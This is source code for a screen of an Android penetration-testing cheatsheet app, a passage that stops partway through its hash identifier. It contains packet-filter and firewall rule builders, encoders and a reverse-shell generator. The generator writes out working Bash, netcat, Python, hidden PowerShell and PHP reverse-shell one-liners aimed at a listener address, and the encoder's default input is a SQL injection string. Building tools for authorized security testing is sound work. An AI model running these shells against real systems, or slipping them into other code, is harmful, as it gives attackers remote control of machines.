package com.hackingcheatsheets.app.ui.screens

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.net.Uri
import android.util.Base64
import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Tab
import androidx.compose.material3.TabRow
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.hackingcheatsheets.app.data.AppLanguage
import com.hackingcheatsheets.app.ui.components.CodeBlockView
import com.hackingcheatsheets.app.ui.components.CommandBuilderView
import com.hackingcheatsheets.app.ui.theme.BackgroundDark
import com.hackingcheatsheets.app.ui.theme.BorderDark
import com.hackingcheatsheets.app.ui.theme.CodeBlockBg
import com.hackingcheatsheets.app.ui.theme.CyberGreen
import com.hackingcheatsheets.app.ui.theme.ExploitRed
import com.hackingcheatsheets.app.ui.theme.SurfaceDark
import com.hackingcheatsheets.app.ui.theme.SurfaceVariantDark
import com.hackingcheatsheets.app.ui.theme.TerminalCyan
import com.hackingcheatsheets.app.ui.theme.TextMuted
import com.hackingcheatsheets.app.ui.theme.TextPrimary
import com.hackingcheatsheets.app.ui.theme.TextSecondary
import com.hackingcheatsheets.app.ui.theme.WarningOrange
import com.hackingcheatsheets.app.viewmodel.CheatsheetViewModel

@Composable
fun UtilitiesScreen(viewModel: CheatsheetViewModel) {
    val language by viewModel.currentLanguage.collectAsState()
    val allCheatsheets by viewModel.allCheatsheets.collectAsState()
    var selectedTab by remember { mutableIntStateOf(0) }
    val tabs = if (language == AppLanguage.TR) listOf("Komut Üretici", "Ağ & Filtre", "Kodlayıcı", "Hash Tanıma", "Ters Kabuk")
               else listOf("Command Builder", "Network & Filter", "Encoder", "Hash Identifier", "Reverse Shell")

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BackgroundDark)
            .padding(horizontal = 16.dp)
    ) {
        Spacer(modifier = Modifier.height(16.dp))
        Text(
            text = if (language == AppLanguage.TR) "HIZLI ARAÇLAR" else "QUICK UTILITIES",
            style = MaterialTheme.typography.headlineLarge,
            color = CyberGreen
        )
        Text(
            text = if (language == AppLanguage.TR) "Saha testleri için çevrimdışı yardımcılar" else "Offline utilities for active assessments",
            style = MaterialTheme.typography.bodyMedium,
            color = TextSecondary
        )
        Spacer(modifier = Modifier.height(16.dp))

        TabRow(
            selectedTabIndex = selectedTab,
            containerColor = SurfaceDark,
            contentColor = CyberGreen,
            modifier = Modifier.clip(RoundedCornerShape(8.dp))
        ) {
            tabs.forEachIndexed { index, title ->
                Tab(
                    selected = selectedTab == index,
                    onClick = { selectedTab = index },
                    text = { Text(text = title, fontSize = 11.sp, maxLines = 1, color = if (selectedTab == index) CyberGreen else TextMuted) }
                )
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        when (selectedTab) {
            0 -> CommandBuilderTab(language, allCheatsheets)
            1 -> NetworkFilterRuleTab(language)
            2 -> EncoderDecoderTab(language)
            3 -> HashIdentifierTab(language)
            4 -> ReverseShellGeneratorTab(language)
        }
    }
}

@Composable
fun CommandBuilderTab(
    language: AppLanguage,
    allCheatsheets: List<com.hackingcheatsheets.app.data.Cheatsheet>
) {
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 90.dp)
    ) {
        item {
            CommandBuilderView(language = language, allCheatsheets = allCheatsheets)
        }
    }
}

@Composable
fun ReverseShellGeneratorTab(language: AppLanguage) {
    var ip by remember { mutableStateOf("10.10.14.5") }
    var port by remember { mutableStateOf("4444") }
    var selectedShell by remember { mutableStateOf("Bash -i") }
    val shells = listOf("Bash -i", "Bash 196", "nc mkfifo", "Python3", "PowerShell", "PHP")

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = ip,
                    onValueChange = { ip = it },
                    label = { Text("LHOST (IP)") },
                    modifier = Modifier.weight(1.5f),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyberGreen,
                        unfocusedBorderColor = BorderDark,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    )
                )
                OutlinedTextField(
                    value = port,
                    onValueChange = { port = it },
                    label = { Text("LPORT") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyberGreen,
                        unfocusedBorderColor = BorderDark,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    )
                )
            }

            Spacer(modifier = Modifier.height(12.dp))

            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                shells.forEach { s ->
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(if (selectedShell == s) CyberGreen else SurfaceVariantDark)
                            .clickable { selectedShell = s }
                            .padding(horizontal = 12.dp, vertical = 8.dp)
                    ) {
                        Text(
                            text = s,
                            color = if (selectedShell == s) BackgroundDark else TextPrimary,
                            fontWeight = FontWeight.Bold,
                            fontSize = 12.sp
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            val payload = when (selectedShell) {
                "Bash -i" -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
                "Bash 196" -> "0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
                "nc mkfifo" -> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
                "Python3" -> "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
                "PowerShell" -> "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
                "PHP" -> "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                else -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
            }

            Text(
                text = if (language == AppLanguage.TR) "ÜRETİLEN TERS KABUK (PAYLOAD)" else "GENERATED REVERSE SHELL",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(4.dp))
            CodeBlockView(code = payload, language = selectedShell)
        }
    }
}

@Composable
fun NetworkFilterRuleTab(language: AppLanguage) {
    var toolMode by remember { mutableIntStateOf(0) } // 0: tcpdump/tshark (BPF), 1: iptables, 2: UFW
    val modes = listOf("tcpdump (BPF)", "tshark", "iptables", "UFW")

    // BPF State
    var bpfPreset by remember { mutableStateOf("syn_only") }
    var iface by remember { mutableStateOf("eth0") }
    var customHost by remember { mutableStateOf("") }
    var customPort by remember { mutableStateOf("") }
    var noDns by remember { mutableStateOf(true) }
    var verbose by remember { mutableStateOf(true) }
    var hexDump by remember { mutableStateOf(false) }
    var pcapFile by remember { mutableStateOf("traffic.pcap") }
    var savePcap by remember { mutableStateOf(false) }

    // iptables State
    var iptAction by remember { mutableStateOf("DROP") }
    var iptProto by remember { mutableStateOf("tcp") }
    var iptPort by remember { mutableStateOf("22") }
    var iptSource by remember { mutableStateOf("10.10.10.0/24") }
    var iptRateLimit by remember { mutableStateOf(true) }
    var iptLog by remember { mutableStateOf(false) }

    // UFW State
    var ufwAction by remember { mutableStateOf("deny") }
    var ufwPort by remember { mutableStateOf("22/tcp") }
    var ufwSource by remember { mutableStateOf("192.168.1.100") }

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            // Mode selector
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                modes.forEachIndexed { idx, name ->
                    val selected = toolMode == idx
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(if (selected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                            .border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(8.dp))
                            .clickable { toolMode = idx }
                            .padding(horizontal = 12.dp, vertical = 7.dp)
                    ) {
                        Text(
                            text = name,
                            color = if (selected) CyberGreen else TextSecondary,
                            fontWeight = if (selected) FontWeight.Bold else FontWeight.Normal,
                            fontSize = 12.sp,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(14.dp))

            when (toolMode) {
                0, 1 -> { // BPF (tcpdump & tshark)
                    Text(
                        text = if (language == AppLanguage.TR) "HAZIR BPF FİLTRE ŞABLONU" else "BPF FILTER PRESET",
                        style = MaterialTheme.typography.labelMedium,
                        color = TerminalCyan
                    )
                    Spacer(modifier = Modifier.height(6.dp))

                    val presets = listOf(
                        "syn_only" to (if (language == AppLanguage.TR) "SYN Taraması (Port Scan)" else "SYN Only (Port Scan)"),
                        "http" to (if (language == AppLanguage.TR) "HTTP İstekleri (GET/POST)" else "HTTP Requests"),
                        "dns" to (if (language == AppLanguage.TR) "DNS Sorguları (Port 53)" else "DNS Queries (Port 53)"),
                        "icmp" to (if (language == AppLanguage.TR) "ICMP Ping (Echo Req/Rep)" else "ICMP Ping"),
                        "arp" to (if (language == AppLanguage.TR) "ARP Trafiği" else "ARP Traffic"),
                        "custom" to (if (language == AppLanguage.TR) "Özel Filtre" else "Custom Filter")
                    )

                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .horizontalScroll(rememberScrollState()),
                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                    ) {
                        presets.forEach { (key, lbl) ->
                            val sel = bpfPreset == key
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(if (sel) TerminalCyan.copy(alpha = 0.2f) else SurfaceVariantDark)
                                    .border(1.dp, if (sel) TerminalCyan else BorderDark, RoundedCornerShape(6.dp))
                                    .clickable { bpfPreset = key }
                                    .padding(horizontal = 10.dp, vertical = 6.dp)
                            ) {
                                Text(
                                    text = lbl,
                                    fontSize = 11.sp,
                                    color = if (sel) TerminalCyan else TextSecondary,
                                    fontWeight = if (sel) FontWeight.Bold else FontWeight.Normal
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(
                            value = iface,
                            onValueChange = { iface = it },
                            label = { Text("Arayüz (-i)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                        OutlinedTextField(
                            value = customPort,
                            onValueChange = { customPort = it },
                            label = { Text("Port (opsiyonel)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    OutlinedTextField(
                        value = customHost,
                        onValueChange = { customHost = it },
                        label = { Text("Hedef Host/IP veya Ağ (opsiyonel)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(8.dp))

                    // BPF toggles
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-nn (DNS ve Port İsimlerini Çözme)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = noDns, onCheckedChange = { noDns = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-v (Ayrıntılı Paket Başlıkları)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = verbose, onCheckedChange = { verbose = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-X (Hex ve ASCII Paket Dökümü)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = hexDump, onCheckedChange = { hexDump = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-w $pcapFile (Trafiği Dosyaya Kaydet)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = savePcap, onCheckedChange = { savePcap = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }

                    val filterCore = when (bpfPreset) {
                        "syn_only" -> "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0"
                        "http" -> "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)"
                        "dns" -> "udp port 53 or tcp port 53"
                        "icmp" -> "icmp[icmptype] == icmp-echo or icmp[icmptype] == icmp-echoreply"
                        "arp" -> "arp"
                        else -> {
                            val fList = mutableListOf<String>()
                            if (customHost.isNotBlank()) fList.add("host ${customHost.trim()}")
                            if (customPort.isNotBlank()) fList.add("port ${customPort.trim()}")
                            if (fList.isEmpty()) "ip" else fList.joinToString(" and ")
                        }
                    }

                    val finalFilter = if (bpfPreset != "custom" && customHost.isNotBlank()) "($filterCore) and host ${customHost.trim()}" else filterCore

                    val tcpdumpCmd = buildString {
                        append("sudo tcpdump -i $iface")
                        if (noDns) append(" -nn")
                        if (verbose) append(" -v")
                        if (hexDump) append(" -X")
                        append(" -s 0")
                        if (savePcap) append(" -w $pcapFile")
                        append(" '$finalFilter'")
                    }

                    val tsharkCmd = buildString {
                        append("tshark -i $iface")
                        if (noDns) append(" -n")
                        append(" -f \"$finalFilter\"")
                        if (savePcap) append(" -w $pcapFile")
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    Text(
                        text = if (toolMode == 0) "ÜRETİLEN TCPDUMP KOMUTU" else "ÜRETİLEN TSHARK KOMUTU",
                        style = MaterialTheme.typography.labelLarge,
                        color = CyberGreen
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    CodeBlockView(code = if (toolMode == 0) tcpdumpCmd else tsharkCmd, language = "bash")
                }
                2 -> { // iptables
                    Text(
                        text = if (language == AppLanguage.TR) "EYLEM (ACTION)" else "ACTION",
                        style = MaterialTheme.typography.labelMedium,
                        color = WarningOrange
                    )
                    Spacer(modifier = Modifier.height(6.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        listOf("DROP", "ACCEPT", "REJECT").forEach { act ->
                            val sel = iptAction == act
                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(if (sel) ExploitRed.copy(alpha = 0.2f) else SurfaceVariantDark)
                                    .border(1.dp, if (sel) ExploitRed else BorderDark, RoundedCornerShape(6.dp))
                                    .clickable { iptAction = act }
                                    .padding(vertical = 7.dp),
                                contentAlignment = Alignment.Center
                            ) { Text(text = act, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (sel) ExploitRed else TextSecondary) }
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(
                            value = iptProto,
                            onValueChange = { iptProto = it },
                            label = { Text("Protokol (-p: tcp, udp)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                        OutlinedTextField(
                            value = iptPort,
                            onValueChange = { iptPort = it },
                            label = { Text("Port (--dport: 22)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                    }

                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = iptSource,
                        onValueChange = { iptSource = it },
                        label = { Text("Kaynak IP / CIDR (-s: 10.10.10.0/24)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(8.dp))
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text(if (language == AppLanguage.TR) "Brute-force Sınırlandırma (Limit 3/min)" else "Rate Limit (3/min)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = iptRateLimit, onCheckedChange = { iptRateLimit = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text(if (language == AppLanguage.TR) "Engellenen Paketleri Logla (-j LOG)" else "Log Dropped Packets", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = iptLog, onCheckedChange = { iptLog = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }

                    val iptCmd = buildString {
                        if (iptLog) {
                            append("sudo iptables -A INPUT -p $iptProto")
                            if (iptPort.isNotBlank()) append(" --dport $iptPort")
                            if (iptSource.isNotBlank()) append(" -s $iptSource")
                            append(" -j LOG --log-prefix \"FIREWALL_BLOCKED: \"\n")
                        }
                        append("sudo iptables -A INPUT -p $iptProto")
                        if (iptPort.isNotBlank()) append(" --dport $iptPort")
                        if (iptSource.isNotBlank()) append(" -s $iptSource")
                        if (iptRateLimit) append(" -m limit --limit 3/min --limit-burst 3")
                        append(" -j $iptAction")
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    Text(
                        text = if (language == AppLanguage.TR) "ÜRETİLEN IPTABLES KURALI" else "GENERATED IPTABLES RULE",
                        style = MaterialTheme.typography.labelLarge,
                        color = CyberGreen
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    CodeBlockView(code = iptCmd, language = "bash")
                }
                3 -> { // UFW
                    Text(
                        text = if (language == AppLanguage.TR) "EYLEM (ACTION)" else "ACTION",
                        style = MaterialTheme.typography.labelMedium,
                        color = WarningOrange
                    )
                    Spacer(modifier = Modifier.height(6.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        listOf("deny", "allow", "limit").forEach { act ->
                            val sel = ufwAction == act
                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceVariantDark)
                                    .border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                                    .clickable { ufwAction = act }
                                    .padding(vertical = 7.dp),
                                contentAlignment = Alignment.Center
                            ) { Text(text = act, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (sel) CyberGreen else TextSecondary) }
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))
                    OutlinedTextField(
                        value = ufwPort,
                        onValueChange = { ufwPort = it },
                        label = { Text("Port / Servis (örn: 22/tcp, 80,443/tcp, OpenSSH)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = ufwSource,
                        onValueChange = { ufwSource = it },
                        label = { Text("Kaynak IP / Subnet (opsiyonel: 192.168.1.100)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )

                    val ufwCmd = if (ufwSource.isNotBlank()) {
                        "sudo ufw $ufwAction from $ufwSource to any port $ufwPort"
                    } else {
                        "sudo ufw $ufwAction $ufwPort"
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    Text(
                        text = if (language == AppLanguage.TR) "ÜRETİLEN UFW KURALI" else "GENERATED UFW RULE",
                        style = MaterialTheme.typography.labelLarge,
                        color = CyberGreen
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    CodeBlockView(code = ufwCmd, language = "bash")
                }
            }
        }
    }
}

@Composable
fun EncoderDecoderTab(language: AppLanguage) {
    var input by remember { mutableStateOf("admin' OR 1=1-- -") }
    var output by remember { mutableStateOf("") }
    var hexWithSpaces by remember { mutableStateOf(false) }

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            OutlinedTextField(
                value = input,
                onValueChange = { input = it },
                label = { Text(if (language == AppLanguage.TR) "Girdi Metni / Değer" else "Input Text / Value") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )

            Spacer(modifier = Modifier.height(12.dp))

            Text(
                text = if (language == AppLanguage.TR) "DÖNÜŞTÜRÜCÜ AKSİYONLARI" else "TRANSFORMATION ACTIONS",
                style = MaterialTheme.typography.labelSmall,
                color = TerminalCyan
            )
            Spacer(modifier = Modifier.height(6.dp))

            // 1. Base64
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = Base64.encodeToString(input.toByteArray(Charsets.UTF_8), Base64.NO_WRAP) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Base64 Enc", fontSize = 10.5.sp, color = CyberGreen) }

                Button(
                    onClick = {
                        output = try { String(Base64.decode(input.trim(), Base64.DEFAULT), Charsets.UTF_8) }
                        catch (e: Exception) { "Invalid Base64 format" }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Base64 Dec", fontSize = 10.5.sp, color = TerminalCyan) }

                Button(
                    onClick = { output = Base64.encodeToString(input.toByteArray(Charsets.UTF_8), Base64.URL_SAFE or Base64.NO_WRAP) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("B64 URL-Safe", fontSize = 10.sp, color = CyberGreen) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            // 2. URL & Hex
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = Uri.encode(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("URL Enc", fontSize = 10.5.sp, color = CyberGreen) }

                Button(
                    onClick = {
                        output = try { Uri.decode(input) } catch (e: Exception) { "Invalid URL encoding" }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("URL Dec", fontSize = 10.5.sp, color = TerminalCyan) }

                Button(
                    onClick = {
                        // Full URL encode every char
                        output = input.map { "%" + String.format("%02X", it.code) }.joinToString("")
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Full URL", fontSize = 10.sp, color = CyberGreen) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            // 3. Hex / ASCII
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = stringToHex(input, hexWithSpaces) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Text -> Hex", fontSize = 10.5.sp, color = CyberGreen) }

                Button(
                    onClick = { output = hexToString(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Hex -> Text", fontSize = 10.5.sp, color = TerminalCyan) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            // 4. HTML & ROT13 & IP Converter
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = htmlEntityEncode(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("HTML Enc", fontSize = 10.sp, color = CyberGreen) }

                Button(
                    onClick = { output = htmlEntityDecode(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("HTML Dec", fontSize = 10.sp, color = TerminalCyan) }

                Button(
                    onClick = { output = rot13(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("ROT13", fontSize = 10.sp, color = WarningOrange) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            Button(
                onClick = {
                    val converted = convertIpv4(input)
                    output = if (converted.isNotEmpty()) {
                        converted.entries.joinToString("\n") { "${it.key}: ${it.value}" }
                    } else {
                        "Geçerli bir IPv4 adresi girin (örn: 127.0.0.1 veya 192.168.1.1)"
                    }
                },
                colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("IPv4 Dönüştür (Decimal, Hex, Octal, Binary)", fontSize = 11.sp, color = CyberGreen)
            }

            Spacer(modifier = Modifier.height(14.dp))

            Text(
                text = if (language == AppLanguage.TR) "SONUÇ" else "OUTPUT",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(4.dp))
            CodeBlockView(code = output.ifEmpty { "(No output yet)" }, language = "text")
        }
    }
}

@Composable
fun HashIdentifierTab(language: AppLanguage) {
    val context = LocalContext.current
    var hashInput by remember { mutableStateOf("") }
    val trimmed = hashInput.trim()
    val entropy = calculateEntropy(trimmed)
    val candidates = identifyHashDetailed(trimmed)

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            OutlinedTextField(
